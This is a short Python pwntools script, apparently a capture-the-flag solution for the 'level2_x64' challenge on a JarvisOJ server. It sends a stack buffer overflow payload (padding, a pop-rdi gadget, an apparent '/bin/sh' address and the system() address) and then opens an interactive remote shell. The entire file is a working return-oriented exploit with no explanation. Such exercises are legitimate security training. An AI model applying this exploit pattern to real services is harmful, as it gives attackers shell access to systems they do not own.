# -*- coding: utf-8 -*-
from pwn import *

conn = remote('pwn2.jarvisoj.com', 9882)
b = ELF('level2_x64')
callsystem = b.symbols['system']
#vulnerable_function_addr = b.symbols['vulnerable_function']
payload = 136 * 'A' + p64(0x00000000004006b3) + p64(0x0000000000600a90) + 8 * p64(callsystem)
conn.send(payload)
conn.interactive()


